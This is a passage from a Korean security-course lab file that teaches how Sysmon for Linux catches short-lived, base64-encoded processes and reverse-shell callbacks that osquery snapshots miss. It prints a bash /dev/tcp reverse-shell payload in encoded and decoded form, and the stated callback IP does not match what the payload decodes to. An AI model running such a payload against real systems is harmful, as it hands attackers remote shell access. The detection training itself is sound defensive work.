lab_id: standalone-secuops-week11
title: "호스트의 비행기록장치 — Sysmon for Linux: 리버스셸·인코딩 명령의 '그 순간'"
version: standalone-secuops
course: secuops
week: 11
description: |
  W07 의 osquery 는 "지금 떠 있는 것"을 찍는 스냅샷이라 단명·인코딩 프로세스를 놓친다. 이번 주는 그
  사각을 메우는 이벤트 스트림 — Microsoft Sysmon for Linux(eBPF) — 를 다룬다. sysmon 은 프로세스가
  생성되는 '그 순간'의 전체 명령줄(base64 인코딩까지)·네트워크 연결·파일 생성을 이벤트로 영구 기록하는
  호스트의 비행기록장치다.

  el34 에서는 sysmon 을 컨테이너가 아니라 호스트({{TARGET_IP}})에 설치했다. el34-web 컨테이너는 비특권
  (CAP_BPF/SYS_ADMIN 없음)이라 eBPF 센서를 못 올리고 인터넷·root 설치도 제한되는 반면, 호스트는 root +
  커널 6.8 + 인터넷이 모두 된다. 컨테이너 프로세스는 네임스페이스로 격리될 뿐 결국 호스트 커널의
  프로세스이므로, 호스트 sysmon 이 el34-web 내부 활동(ProcessCreate/NetworkConnect/FileCreate)까지 그대로
  포착한다.

  base64 리버스셸 사슬(인코딩 명령 → 콜백 53666 → 페이로드 drop → 백도어 계정)을 재현하면서, osquery
  스냅샷이 놓치는 단명·인코딩 프로세스를 sysmon 이벤트가 잡는 대비를 직접 본다. 반대로 지속 상태(백도어
  계정)는 osquery 스냅샷이 강한 영역임을 확인해 두 도구의 역할 분담을 정리한다.

  공격은 `ssh ccc@10.20.32.80 …`, sysmon 관측은 호스트의 `/var/log/syslog`(Linux-Sysmon 소스, ccc=adm
  그룹이라 sudo 불필요). sysmon 데몬 자체는 영속 인프라(유지). 실습이 만든 계정/파일/프로세스만
  self-clean — el34 호스트는 공유 자원이므로 흔적을 끝까지 남기지 않는 것까지가 SOP 다.
difficulty: hard
duration_minutes: 200
prerequisites:
  - "W07(osquery 스냅샷) · W09–W10(Wazuh) 통과"
  - "장비 직접 SSH: ssh ccc@<장비IP>(fw 10.20.30.1/ips 31.2/web 32.80/siem 32.100) + 공격 ssh att@192.168.0.202 (비번 1)"
  - "lecture §1(스냅샷 vs 이벤트) §5(ProcessCreate) §6-§7(Net/File) 숙지"
objectives:
  - "스냅샷(osquery)과 이벤트 스트림(sysmon)의 본질적 차이를 설명하고, 단명·인코딩 위협이 왜 스냅샷의 사각인지 근거를 댄다"
  - "sysmon 을 왜 컨테이너가 아니라 호스트({{TARGET_IP}})에 설치했는지(eBPF 권한·인터넷·네임스페이스) 설명하고, 호스트 센서가 컨테이너까지 보는 원리를 안다"
  - "호스트 sysmon 데몬(eBPF 센서) + config(3 EventID) + syslog 적재(Linux-Sysmon) 가용성을 30초에 점검한다"
  - "base64 인코딩 리버스셸 페이로드를 디코드해 /dev/tcp/...53666 콜백 의도를 밝힌다"
  - "ProcessCreate(EventID 1)로 단명·인코딩 프로세스를 포착하고, 같은 위협을 osquery 스냅샷은 놓치는(빈 결과) 대비를 재현한다"
  - "NetworkConnect(3) 콜백 + FileCreate(11) 페이로드 drop 의 '그 순간'을 sysmon 이벤트로 추적한다"
  - "지속 상태(백도어 계정)는 osquery 스냅샷이 강한 영역임을 확인해 두 도구의 역할 분담을 정리하고, 아티팩트는 self-clean 하되 sysmon 은 영속 인프라로 보존한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — 호스트 sysmon(비행기록장치)이 돌고 있나

      이벤트 스트림의 전제는 센서(sysmon)가 호스트에 살아 있는 것이다. 센서가 멈추면 그 순간부터의 모든
      이벤트가 사라지므로, 운영 인수 첫 30초의 점검이다. el34 호스트에 Sysmon for Linux 가 systemd
      데몬으로 가동되고, RuleGroup(config 가 정한 기록 필터)과 syslog 적재가 살아있는지 본다.

      ## 📖 개념 한 줄
      - **sysmon**: eBPF(커널 안에 안전하게 심은 센서)로 호스트 커널 이벤트를 잡아 `/var/log/syslog` 에
        `Linux-Sysmon` XML 로 남기는 호스트 이벤트 기록 도구. 컨테이너 프로세스도 호스트 커널 프로세스라
        함께 포착된다.

      ## 💻 실행 명령 (호스트에서)
      ```bash
      systemctl is-active sysmon
      sysmon -c 2>/dev/null | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
      grep -ac "Linux-Sysmon" /var/log/syslog
      ```
      - `systemctl is-active sysmon` — eBPF 센서 데몬의 가동 여부(`active`/`inactive`).
      - `sysmon -c` — 현재 config(RuleGroup)를 출력. 이번 환경은 3 EventID 만 잡는다.
      - `grep -ac Linux-Sysmon /var/log/syslog` — 실제로 이벤트가 적재되고 있는지(건수). `-a` 는 로그를
        텍스트로 취급(바이너리 오인 방지), `-c` 는 매치 건수.

      ## ✅ 합격 기준
      sysmon `active` + config에 3 event(ProcessCreate/NetworkConnect/FileCreate) + syslog에
      `Linux-Sysmon` 적재(0 이 아님).
    hint: 'systemctl is-active sysmon + sysmon -c + grep Linux-Sysmon /var/log/syslog'
    category: survey
    points: 10
    answer: |
      echo "=== sysmon 데몬 ==="
      systemctl is-active sysmon
      echo "=== config event 종류 ==="
      sysmon -c 2>/dev/null | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
      echo "=== syslog 적재량 ==="
      grep -ac "Linux-Sysmon" /var/log/syslog
    answer_detail: "Sysmon for Linux(el34 호스트에 1.5.2 설치)는 eBPF 센서로 호스트 커널 이벤트를 잡아 /var/log/syslog 에 Linux-Sysmon XML 로 기록한다. 컨테이너(el34-web)는 네임스페이스로 격리될 뿐 자체 커널이 없어, 컨테이너 안 프로세스도 결국 호스트 커널 프로세스 → 호스트 sysmon 이 그대로 포착한다. ccc 는 adm 그룹이라 sudo 없이 syslog 를 읽는다. 판정: systemctl 이 active 이고 config 에 3 EventID, syslog 적재가 0 이 아니면 센서·필터·적재 3박자가 살아 있는 것."
    verify:
      type: output_contains
      expect: 'active'
      field: stdout
      semantic:
        intent: "호스트 sysmon 데몬/설정/적재 가용성 점검"
        success_criteria: ["sysmon active", "config 3 event(Process/Network/File)", "syslog Linux-Sysmon 적재"]
        acceptable_methods:
          - "**[OSS] systemctl + sysmon -c + syslog grep (권장)**"
          - "**[설명] 호스트 sysmon이 컨테이너까지 포착하는 원리**"
    target_vm: siem

  - order: 2
    instruction: |
      ## 🎯 base64 리버스셸 페이로드 디코드

      공격자는 명령이 로그·탐지에 평문으로 남지 않도록 base64 로 인코딩해 의도를 숨긴다. 분석가는
      디코드로 그 의도를 되살린다. 이 인코딩 덩어리를 풀어 진짜 명령을 밝힌다.

      ## 📖 개념 한 줄
      - **base64**: 임의 데이터를 알파벳·숫자 문자열로 바꾸는 인코딩(사람 눈엔 무의미한 글자 덩어리).
        `base64 -d`(decode)로 원래 데이터를 복원한다.
      - **리버스셸**: 피해 호스트가 거꾸로 공격자에게 연결을 걸어 셸을 내주는 것. `bash -i >&
        /dev/tcp/<IP>/<포트> 0>&1` 형태이며, `/dev/tcp/...` 는 bash 가 그 주소·포트로 TCP 를 여는 가상
        장치다.

      ## 💻 실행 명령
      ```bash
      echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=' | base64 -d
      ```
      - `base64 -d` — 표준입력의 base64 문자열을 디코드해 원래 명령을 출력.

      ## ✅ 합격 기준
      디코드 결과에 `/dev/tcp/...53666` 이 드러나, 이 명령이 셸을 외부로 되돌리는 리버스셸임이 식별된다.
    hint: 'base64 -d 로 페이로드 디코드 → /dev/tcp 리버스셸'
    category: analysis
    points: 10
    answer: |
      echo "=== base64 페이로드 디코드 ==="
      echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=' | base64 -d
      echo ""
      echo "→ bash 리버스셸: /dev/tcp/192.168.0.202/53666 로 셸을 되돌림"
    answer_detail: "base64 로 위장한 명령을 -d 로 디코드하면 'bash -i >& /dev/tcp/192.168.0.202/53666 0>&1' 리버스셸이 드러난다 — 피해 호스트가 192.168.0.202:53666 으로 거꾸로 셸을 되돌린다는 뜻. 방화벽이 '밖→안'은 막아도 '안→밖'은 허용하는 점을 노린 우회다. 핵심: sysmon ProcessCreate(EventID 1)는 이 디코딩/실행 명령의 cmdline 자체를 event 로 남기므로, 인코딩으로 위장해도 사후에 '무엇을 디코드해 실행했나'를 복원할 수 있다. 판정: 출력에 dev/tcp 가 보이면 의도 식별 성공."
    verify:
      type: output_contains
      expect: 'dev/tcp'
      field: stdout
      semantic:
        intent: "인코딩된 리버스셸 페이로드 디코드로 의도 파악"
        success_criteria: ["base64 -d 디코드", "/dev/tcp 리버스셸 식별", "포트 53666"]
        acceptable_methods:
          - "**[OSS] base64 -d (권장)**"
          - "**[설명] 인코딩 회피 기법**"
    target_vm: siem

  - order: 3
    instruction: |
      ## 🎯 ProcessCreate(EventID 1) — 단명·인코딩 프로세스: sysmon vs osquery

      W11 의 핵심 대비다. el34-web 안에서 인코딩 명령을 **짧게** 실행한 뒤 두 도구로 같은 위협을 본다.
      osquery 스냅샷은 이미 죽은 프로세스를 못 찾지만(조사 시점에 살아 있어야 보임), sysmon 은 **생성된
      순간**의 전체 cmdline 을 syslog 에 남겨 놓았다 — 이것이 이벤트 스트림의 존재 이유다.

      ## 📖 개념 한 줄
      - **ProcessCreate(EventID 1)**: 새 프로세스가 생성되는 바로 그 순간을 전체 명령줄(cmdline)과 함께
        남기는 sysmon 이벤트. 프로세스가 죽어도 생성 사실은 영구히 남는다.
      - **단명 프로세스**: 아주 짧게 실행되고 즉시 종료되는 프로세스 — 스냅샷의 사각.

      ## 💻 실행 명령

      **실행 위치:** 단명 프로세스 실행·osquery 는 `el34-web`(`ssh ccc@10.20.32.80`),
      sysmon syslog 관측은 **el34 호스트**(컨테이너 아님)에서.

      ```bash
      # ── el34-web 에서: 단명 인코딩 프로세스 실행(곧 종료) ──
      python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim"

      # ── el34-web 에서: osquery 스냅샷 (이미 종료 → 못 찾음, 빈 배열이 정상) ──
      osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'

      # ── el34 호스트에서: sysmon ProcessCreate (생성 순간이 syslog에 남음) ──
      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "b64decode" | tail -1 | grep -ao "CommandLine>[^<]*"
      ```
      - 1행: el34-web 에서 b64decode 를 부르는 단명 프로세스 실행(곧 종료).
      - osquery `processes` 쿼리: 조사 시점엔 이미 죽어 빈 배열 `[]` 가 정상.
      - sysmon grep: 생성 순간의 `CommandLine>...b64decode...` 가 syslog 에 보존돼 있음.

      ## ✅ 합격 기준
      sysmon syslog에 `b64decode` 인코딩 명령의 ProcessCreate(EventID 1)가 남아 있다(osquery 는 빈 결과 —
      실패가 아니라 스냅샷의 사각을 보여주는 것).
    hint: '단명 인코딩 프로세스 → osquery 빈결과 vs sysmon syslog 포착(b64decode)'
    category: detect
    points: 18
    answer: |
      ssh ccc@10.20.32.80 python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim" 2>/dev/null
      sleep 2
      echo "=== osquery 스냅샷 (이미 종료된 프로세스 → 못 찾음) ==="
      ssh ccc@10.20.32.80 osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
      echo "=== sysmon ProcessCreate (생성 순간 syslog에 보존) ==="
      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "b64decode" | tail -1 | grep -ao "CommandLine>[^<]*" | head -1
    answer_detail: "핵심 대비 — 단명/인코딩 프로세스는 osquery 스냅샷(조사 시점에 살아 있어야 보임)이 놓치지만(빈 배열 [] 반환), sysmon ProcessCreate(EventID 1)는 생성된 그 순간의 전체 cmdline 을 syslog 에 남긴다. 프로세스가 죽은 뒤에도 '무엇을 실행했나'를 추적 가능 — sysmon 의 존재 이유. osquery 의 빈 결과는 실패가 아니라 스냅샷의 본질적 한계를 드러내는 것이다. 판정: sysmon 쪽 출력에 b64decode 가 포함된 ProcessCreate 가 보이면 성공."
    verify:
      type: output_contains
      expect: 'b64decode'
      field: stdout
      semantic:
        intent: "단명·인코딩 프로세스를 sysmon ProcessCreate로 포착(osquery 스냅샷 한계 대비)"
        success_criteria: ["osquery 빈 결과(종료된 프로세스)", "sysmon syslog에 b64decode cmdline", "이벤트 스트림 vs 스냅샷 이해"]
        acceptable_methods:
          - "**[OSS] sysmon syslog grep vs osquery processes (권장)**"
          - "**[설명] 단명 프로세스 = 스냅샷 사각**"
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 NetworkConnect(EventID 3) — 콜백 연결의 순간

      리버스셸은 피해 호스트가 공격자에게 거꾸로 연결을 건다. 그 콜백 포트(53666)로의 연결을 sysmon 이
      NetworkConnect event 로 남기는지 본다. 안전을 위해 실제 외부 콜백 대신 호스트 루프백
      (127.0.0.1:53666)으로 연결을 모사한다.

      ## 📖 개념 한 줄
      - **NetworkConnect(EventID 3)**: 프로세스가 외부로 TCP 연결을 맺는 순간을 목적지 IP·포트와 함께
        남기는 sysmon 이벤트. 단순히 '연결이 있었다'가 아니라 '어느 프로세스가 어디로' 를 호스트 내부
        관점에서 본다(경계의 Suricata 와 상호 보완).

      ## 💻 실행 명령
      ```bash
      nohup python3 -m http.server 53666 --bind 127.0.0.1 >/dev/null 2>&1 &
      sleep 1
      nc -w2 -z 127.0.0.1 53666   # 콜백 연결 모사(nc 로 아웃바운드 연결)
      pkill -f "http.server 53666"
      sleep 2
      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "<EventID>3<" | grep -a "53666" | tail -1 | cut -c1-160
      ```
      - `nohup ... http.server 53666 &` — 53666 에 임시 리스너를 띄움(콜백 상대 모사).
      - `curl ... 127.0.0.1:53666` — 그 포트로 연결을 한 번 일으킴(콜백 모사).
      - `pkill` — 리스너 정리(잔재 방지).
      - sysmon grep: `<EventID>3<` + `53666` 의 NetworkConnect 한 줄을 확인.

      ## ✅ 합격 기준
      sysmon syslog에 포트 `53666` 대상 NetworkConnect(EventID 3)가 남는다.
    hint: '리스너 53666 + 연결 → sysmon EventID 3 (DestinationPort 53666)'
    category: detect
    points: 16
    answer: |
      nohup python3 -m http.server 53666 --bind 127.0.0.1 >/dev/null 2>&1 &
      sleep 1
      nc -w2 -z 127.0.0.1 53666 >/dev/null 2>&1
      pkill -f "http.server 53666" 2>/dev/null
